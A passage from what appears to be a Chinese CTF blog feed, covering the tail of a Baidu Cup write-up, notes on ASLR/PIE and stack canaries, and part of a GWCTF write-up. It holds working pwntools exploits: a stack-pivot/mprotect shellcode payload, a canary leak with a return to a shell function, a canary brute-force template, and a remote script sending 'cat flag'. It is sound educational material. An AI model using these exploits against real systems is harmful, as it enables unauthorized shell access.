class="number">4</span>) <span class="comment"># fake file</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">156</span>) <span class="comment"># fake file ending &amp;amp; point to gadget</span></span><br><span class="line">payload += p32(pop_esp_ret)</span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">200</span>) <span class="comment"># stack pivot to enlarge 200 </span></span><br><span class="line">payload += p32(xchg_esp_eax_ret)</span><br><span class="line">fill_up = <span class="number">200</span> - <span class="built_in">len</span>(payload) + <span class="number">32</span></span><br><span class="line">payload += &amp;<span class="comment">#039;b&amp;#039; * fill_up</span></span><br><span class="line">payload += p32(mprotect_addr) <span class="comment"># call mprotect</span></span><br><span class="line">payload += p32(<span class="number">0x080efa00</span> + <span class="number">200</span> + <span class="number">20</span>) <span class="comment"># ret to shellcode</span></span><br><span class="line">payload += p32(<span class="number">0x080ef000</span>) <span class="comment"># argv 1</span></span><br><span class="line">payload += p32(<span class="number">1024</span>) <span class="comment"># argv 2</span></span><br><span class="line">payload += p32(<span class="number">7</span>) <span class="comment"># argv 3</span></span><br><span class="line">payload += encoders.encoder.line(asm(shellcraft.sh())) <span class="comment"># shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send name(payload)</span></span><br><span class="line">p.recvuntil(&amp;quot;name?&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># exit to run fclose</span></span><br><span class="line">p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">3</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20200117004101.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 百度杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASLR与PIE学习笔记</title>
      <link href="archives/9058dffc/"/>
      <url>archives/9058dffc/</url>
      
        <content type="html"><![CDATA[<p>对于 ASLR 和 PIE 一直没有系统归纳，部分概念时常混淆，做个笔记记录一下。</p><h2 id="ASLR-是什么？"><a href="#ASLR-是什么？" class="headerlink" title="ASLR 是什么？"></a>ASLR 是什么？</h2><p><strong>ASLR 是 Linux操作系统的功能选项，作用于程序（ELF）装入内存运行时</strong>。是一种针对缓冲区溢出的安全保护技术，通过对加载地址的随机化，防止攻击者直接定位攻击代码位置，到达阻止溢出攻击的一种技术。</p><h3 id="开启、关闭ASLR"><a href="#开启、关闭ASLR" class="headerlink" title="开启、关闭ASLR"></a>开启、关闭ASLR</h3><p>查看当前系统ASLR的打开情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>ASLR 有三个安全等级：</p><ul><li><strong>0</strong>： ASLR 关闭</li><li><strong>1</strong>：随机化栈基地址（stack）、共享库（.so\libraries）、mmap 基地址</li><li><strong>2</strong>：在<strong>1</strong>基础上，增加随机化堆基地址（chunk）</li></ul><h2 id="PIE-是什么？"><a href="#PIE-是什么？" class="headerlink" title="PIE 是什么？"></a>PIE 是什么？</h2><p><strong>PIE 是 gcc 编译器的功能选项，作用于程序（ELF）编译过程中</strong>。是一个针对代码段（ .text ）、数据段（ .data ）、未初始化全局变量段（ .bss ）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具来帮助解题。</p><h3 id="开启-PIE"><a href="#开启-PIE" class="headerlink" title="开启 PIE"></a>开启 PIE</h3><p>在使用 gcc 编译时加入参数<code>-fPIE</code>。</p><p>PIE 开启后会随机化代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）的加载地址。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th></th><th align="left">作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td align="left"><strong>1</strong>：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br /><strong>2</strong>：在<strong>1</strong>基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td align="left">代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>PIE 绕过题目笔记补充</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/177520">【PIE保护详解和常用bypass手段】</a></p><p><a href="https://www.twblogs.net/a/5c23ac5cbd9eee16b4a7c794">【ASLR，PIE，PIC的相似處及區別】</a></p><p><a href="https://blog.51cto.com/duallay/1876841">【ASLR和PIE】</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ASLR </tag>
            
            <tag> PIE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary学习笔记</title>
      <link href="archives/60c4a128/"/>
      <url>archives/60c4a128/</url>
      
        <content type="html"><![CDATA[<h2 id="Canary是什么"><a href="#Canary是什么" class="headerlink" title="Canary是什么"></a><strong>Canary是什么</strong></h2><p>由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc/glibc里, 直到现在也作为系统安全的第一道防线存在。</p><p>canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack/buffer overflow是否发生。</p><p>Canary与windows下的GS保护都是防止栈溢出的有效手段，几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。</p><h2 id="在GCC中使用Canary"><a href="#在GCC中使用Canary" class="headerlink" title="在GCC中使用Canary"></a><strong>在GCC中使用Canary</strong></h2><p>在GCC中使用以下参数设置Canary:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure><h2 id="Canary实现原理"><a href="#Canary实现原理" class="headerlink" title="Canary实现原理"></a>Canary实现原理</h2><p>当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。 这个操作即为向栈中插入Canary值，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>Canary保护的stack结构大概如下(64位)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。</p><p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F; _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  &#x2F;&#x2F; glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  &#x2F;&#x2F; 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard &#x3D; _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary绕过技术"><a href="#Canary绕过技术" class="headerlink" title="Canary绕过技术"></a>Canary绕过技术</h2><h3 id="泄露栈中的Canary"><a href="#泄露栈中的Canary" class="headerlink" title="泄露栈中的Canary"></a><strong>泄露栈中的Canary</strong></h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串，简单点说就是正常情况下，不能被 printf 等输出函数输出，防止泄露。 泄露栈中的 Canary 的思路是覆盖 Canary 的最后一个字节”\x00”，来打印出剩余的 Canary 部分。</p><p>这种利用方式需要存在合适的<strong>输出函数</strong>，或者通过<strong>格式化字符串</strong>泄漏。并且可能需要第一次溢出泄露 Canary，之后再次溢出恢复 Canary 最后一位，才能控制执行流程。举个例子来说：想控制 vul() 函数执行流程，需要在 vul() 内溢出两次。</p><p><strong>利用示例</strong></p><p>编译为 32bit 程序，开启 NX，ASLR，Canary 保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ex2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;unistd.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdlib.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;string.h&amp;gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(&amp;quot;/bin/sh&amp;quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&amp;lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(&amp;quot;Hello Hacker!&amp;quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = &amp;<span class="comment">#039;ex2&amp;#039;</span></span><br><span class="line"><span class="comment">#context.log_level = &amp;#039;debug&amp;#039;</span></span><br><span class="line">io = process(&amp;<span class="comment">#039;./ex2&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">get_shell = ELF(&amp;quot;./ex2&amp;quot;).sym[&amp;quot;getshell&amp;quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&amp;quot;Hello Hacker!\n&amp;quot;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = &amp;quot;A&amp;quot;*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&amp;quot;A&amp;quot;*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span></span><br><span class="line">log.info(&amp;quot;Canary:&amp;quot;+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">payload = &amp;quot;\x90&amp;quot;*<span class="number">100</span>+p32(Canary)+&amp;quot;\x90&amp;quot;*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h3><p>每次进程重启后的 Canary 不同，但是同一个进程中的不同线程的 Canary 是相同的，并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存，就是子进程会继承父进程的Canary。</p><p>当我们子进程由于Canary判断不正确导致程序crash（崩溃）后，父进程不会Crash。利用这样的特点，彻底逐个字节将Canary爆破出来，爆破模板如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> &amp;quot;[+] Brute forcing stack canary &amp;quot;</span><br><span class="line"></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &amp;lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != &amp;quot;&amp;quot;:</span><br><span class="line">         p = p + <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="comment">#print &amp;quot;\t[+] Byte found 0x%02x&amp;quot; % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="built_in">print</span> &amp;quot;[-] Exploit failed&amp;quot;</span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(&amp;quot;<span class="built_in">hex</span>&amp;quot;)</span><br><span class="line"><span class="built_in">print</span> &amp;quot;   [+] SSP value <span class="keyword">is</span> 0x%s&amp;quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p><strong>例题</strong></p><ul><li><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p></li><li><p><a href="https://www.jianshu.com/p/110f715c210f">xman babystack</a></p></li></ul><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p><strong>例题</strong></p><ul><li>StarCTF2018 babystack</li></ul><h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h3><p>这种操作的核心思想就是想办法让他不执行canary的报错或者直接跳过canary的检查。</p><p>利用格式化字符串或者数组下标越界，可以栈地址任意读写，不必<strong>连续</strong>向栈上写，直接写ebp和ret因此不会触发Canary检查。也就是不覆写canary。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h2><p>[1] ctf-wiki.<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">canary-zh</a></p><p>[2] 23R3F.<a href="https://www.jianshu.com/p/c3624f5dd583">PWN之canary骚操作</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广东外语外贸大学第三届网络安全大赛Writeup</title>
      <link href="archives/6d430184/"/>
      <url>archives/6d430184/</url>
      
        <content type="html"><![CDATA[<blockquote><p>官方WP：<a href="https://github.com/gwht/2019GWCTF/tree/master/">https://github.com/gwht/2019GWCTF/tree/master/</a></p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>是男人就下150层嘛，也就是答对150次计算题就返回 flag 嘛。这道题与 pwnable.kr 的一道题很像。题目有作答时间限制，所以用脚本跑吧。<del>可能是人品问题，跑了很多次，最好的就是回答到 147 之后就链接断了（垃圾校园网？）。</del></p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = remote(&amp;quot;<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>&amp;quot;,<span class="number">10034</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> n&amp;lt;<span class="number">150</span>:</span><br><span class="line">p.recvuntil(&amp;quot;Math problem: &amp;quot;)</span><br><span class="line">math = p.recvuntil(&amp;quot;=&amp;quot;)[:-<span class="number">2</span>]</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(math)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.sendline(&amp;quot;cat flag&amp;quot;)</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h3><p>python文件的反编译。这里使用的是工具<strong>Easy Python Decompiler</strong>，或者可以<a href="https://tool.lu/pyc/">在线python反编译</a>（可能存在重复代码bug）。</p><p>反编译得到的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: encode.py</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1) <span class="comment">#23</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里就是一个加密程序，逆算法就可以了。源码中的第一个 for 循环里面分两种情况（小于128、大于128）带入数据计算后，得出简化加密：<code>(input1[i] + i) % 128</code>。</p><p>第二个 for 循环中的是列表连续异或，解密时需要从尾部开始再次进行异或。</p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [&amp;<span class="comment">#039;\x1f&amp;#039;, &amp;#039;\x12&amp;#039;, &amp;#039;\x1d&amp;#039;, &amp;#039;(&amp;#039;, &amp;#039;0&amp;#039;, &amp;#039;4&amp;#039;, &amp;#039;\x01&amp;#039;, &amp;#039;\x06&amp;#039;, &amp;#039;\x14&amp;#039;, &amp;#039;4&amp;#039;, &amp;#039;,&amp;#039;, &amp;#039;\x1b&amp;#039;, &amp;#039;U&amp;#039;, &amp;#039;?&amp;#039;, &amp;#039;o&amp;#039;, &amp;#039;6&amp;#039;, &amp;#039;*&amp;#039;, &amp;#039;:&amp;#039;, &amp;#039;\x01&amp;#039;, &amp;#039;D&amp;#039;, &amp;#039;;&amp;#039;, &amp;#039;%&amp;#039;, &amp;#039;\x13&amp;#039;]</span></span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span> l</span><br><span class="line">a = <span class="built_in">map</span>(<span class="built_in">ord</span>,a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">a[i-<span class="number">1</span>] = a[i-<span class="number">1</span>]^a[i]</span><br><span class="line">code = &amp;<span class="comment">#039;&amp;#039;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">num = (a[i]-i) % <span class="number">128</span></span><br><span class="line">code += <span class="built_in">chr</span>(num)</span><br><span class="line"><span class="built_in">print</span> code</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="史上最简单的pwn"><a href="#史上最简单的pwn" class="headerlink" title="史上最简单的pwn"></a>史上最简单的pwn</h3><p>32位 C++ 编写的程序，运行（或）需要安装libc：<code>sudo aptitude -f install lib32stdc++6</code></p><p>栈溢出题目，选择的溢出变量为 s 。单单才变量信息看上去没有问题，不存在溢出。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191209160424.png"></p><p>但是后面的会将字符串中的 I 替换为 pretty。只用 I 够多就能覆写 eip。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191209160727.png"></p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 